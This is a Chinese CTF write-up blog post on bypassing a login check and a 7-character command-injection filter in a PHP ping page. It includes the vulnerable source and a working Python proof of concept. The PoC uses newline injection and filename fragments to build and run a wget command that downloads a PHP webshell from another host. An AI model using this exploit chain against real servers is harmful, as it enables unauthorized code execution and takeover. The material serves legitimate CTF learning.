---
title: 绕过7个字符getshell
date: 2017-05-08 21:37:31
tags: 
- 命令执行
- Linux
categories: 
- CTF
---


### 参考文章：

> http://isron.dropsec.xyz/2017/04/10/shell-7/  
> http://www.moonsos.com/post/256.html  
> http://wonderkun.cc/index.html/?p=524


### 原理解析
从wonderkun师傅的[github](https://github.com/clearloveQAQ/CTF_web/tree/master/web200-3 "github")
上d下原码，在本地实现下。不多说，直接上原码
<!--more-->

~~~PHP
$_POST = dAddslashes($_POST);
$_GET = dAddslashes($_GET);
$username = isset($_POST['username']) ? $_POST['username'] : die();
$password = isset($_POST['password']) ? md5($_POST['password']) : die();
$sql = "select password from users  where username='$username'";
$result = $conn->query($sql);
if (!$result) {
    die('<script>alert("用户名或密码错误!!")</script>');
}

$row = $result->fetch_assoc();

if ($row[0] === $password) {
    $_SESSION['username'] = $username;
    $_SESSION['status'] = 1;
    header("Location:./ping.php");

} else {

    die("<script>alert('用户名或密码错误!!')</script>");
}
~~~

这里的post上去的数据进行全局过滤，不考虑注入，这个里面有一个绕过点，首先看到password在跟数据库的数据进行比对的时候是经过md5哈希过的，所以可以通过和md5(数组)=空来绕过$row[0]===$password。这里涉及一个绕过php强等于的过程，php的===不仅比较值，还比较类型。http://static.hx99.net/static/drops/tips-7679.html（php比较操作符的安全问题）
现在如果我们输入一个空的username的话，row肯定为空，让passwordpost上去的时候为数组，这样就构成null=o开头的字符串，成功绕过$row[0] === $password

> playload：username=a&&password[]=a

进入ping.php，有一个一看就像命令执行的ping命令的执行框。
查看原码
~~~PHP
$ip=isset($_POST['ip'])?$_POST['ip']:die();
    // $ip =isset($_GET['ip'])?$_GET['ip']:die();
    if(!preg_match("/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/i",$ip)){
          die("<pre>ip 格式错误!!</pre>");
    }
    $substitutions = array(
        '&'  => '',
        ';' => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '|' => '',
     );
   $ip = str_replace( array_keys( $substitutions ), $substitutions, $ip );
  //  echo strlen($ip)."</br>";
  //  echo $ip;
   if(strlen($ip)<7||strlen($ip)>15){
       die("<pre>ip 长度错误!</pre>");
   }
    $dir = 'sandBox/'.$_SERVER['REMOTE_ADDR'];
    if(!file_exists($dir)) mkdir($dir);
    chdir($dir);

    $comments = <<<INFO
   <!--
      \$dir = 'sandBox/'.\$_SERVER['REMOTE_ADDR'];
    if(!file_exists(\$dir)) mkdir(\$dir);
    chdir(\$dir); 
   -->
INFO;
    echo $comments;

    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $ip );
    }else{
            // *nix
            $cmd = shell_exec( 'ping  -c 1 ' . $ip );
    }
        // Feedback for the end user
        echo  "<pre>$cmd</pre>";
~~~

过滤了一些命令执行的一些关键词 &;$()`| ，全部替换为空了。然后输入的内容长度必须在7到15之间（IP长度限制）  
最上面参考文章的大佬说没有过滤换行符%0a，换行符过滤正则表达式的匹配和字符长度匹配。也就是通过ping 0.0.0.0  加上%0a(shell命令)来绕过不能用linux的连接词的过滤。  
可以通过wget 命令 远程下载一个shell，但是由于字符限制，所以需要用到/来连接2行命令的字符。  

### 利用方式  

上poc  

~~~python
#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
def GetShell():
    s=requests.session()
    url = "http://192.168.60.128/CTF/wonderkun/CTF_web/web200-3/src/ping.php"
    url1 = "http://192.168.60.128/web200-3/src/"
    header = {
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data1={'username':'a','password[]':'a'}
    s.post(url1,data=data1,headers=header)
    '''
    wget\\
    \ 19\\
    2.\\
    16\\
    8.\\
    60.\\
    12\\
    8\ \\
    1.php\ \\
    -O\ \\
    2.php
    '''
    fileNames = ["2.php", "-O\ \\\\", "1.php\ \\","8\ \\\\", "12\\\\", "60.\\\\", "8.\\\\", "16\\\\","2.\\\\", "\ 19\\\\", "wget\\\\"]
   # 多出的\只是为了充填，无论几个\都是一样的作用
    ip = "0.0.0.1%0a"
    for fileName in fileNames:
        createFileIp = ip + ">" + fileName
        print createFileIp
        data = "ip=" + createFileIp
        s.post(url, data=data,headers=header,)
    getShIp = ip + "ls%20-t>1"  #新生成的文件输入进1中
    print getShIp
    data = "ip=" + getShIp
    s.post(url, data=data,headers=header)
    getShellIp = ip + "sh%201" # 执行1这个脚本
    print getShellIp
    data = "ip=" + getShellIp
    s.post(url, data=data,headers=header)
if __name__ == "__main__":
    GetShell()
~~~  

为了wget，先是把他们生成很多个临时文件，然后ls -t>1，然后再sh一下就执行了。我在测试的时候wget了自己的虚拟机，然后生成的文件里面是sever 500 的提示，想了半天自己的虚拟机又不在网络上，怎么可能wget到，真的是石乐志，哈哈。
